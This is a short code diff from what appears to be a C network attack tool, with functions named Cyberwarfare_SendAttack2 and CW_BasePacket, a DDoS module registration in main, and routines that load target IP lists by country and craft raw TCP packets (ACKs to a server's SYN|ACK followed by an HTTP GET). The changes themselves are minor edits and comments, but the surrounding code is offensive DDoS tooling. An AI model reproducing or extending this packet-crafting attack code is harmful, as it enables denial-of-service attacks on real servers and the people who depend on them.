@@ -116,9 +116,7 @@ int packet_filter(uint32_t seq, uint32_t ip, int port, uint32_t ts, uint32_t *ge
     xyz.a.d = (port & 0x000000ff);
     xyz.a.e = ((xyz.a.c + xyz.a.d) & 0x000000ff);
 
-    if (!gen)
-        ts -= 3;
-    else
+    if (gen)
         ts += 2;
     
     for (i =0; i < 5; i++) {
@@ -188,8 +186,6 @@ PacketBuildInstructions *CW_BasePacket(uint32_t src, int src_port, uint32_t dst,
 
     bptr->source_port = src_port;
     bptr->destination_port = dst_port;
-
-//    bptr->header_identifier = qptr->client_identifier++;
 
     return bptr;
 }
@@ -392,7 +388,6 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     char req_data[] = "GET / HTTP/1.0\r\n\r\n";
     int req_data_size = sizeof(req_data);
 
-
     // build ACK for the servers SYN|ACK
     bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
     if (!bptr) return 0;    
@@ -441,10 +436,7 @@ end:;
     return ret;
 }
 
-
-//IPAddressesAddGeo(AS_context *ctx, char *country, uint32_t ip, 
-//struct in6_addr *ipv6) {
-
+// turns a list of IP addresses on lines from a file into IPAddress type
 int file_to_iplist(AS_context *ctx, char *filename, char *country) {
     char *sptr = NULL;
     FILE *fd;
@@ -522,9 +514,11 @@ int main(int argc, char *argv[]) {
 
     Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);
 
+    // open and turn both files into IPaddress lists
     while (files[i] != NULL) {
         r = file_to_iplist(ctx, files[i], tag[i]);
         
+        // if it failed.. bad=1
         if (r <= 0) { bad = 1; break; }
 
         i++;
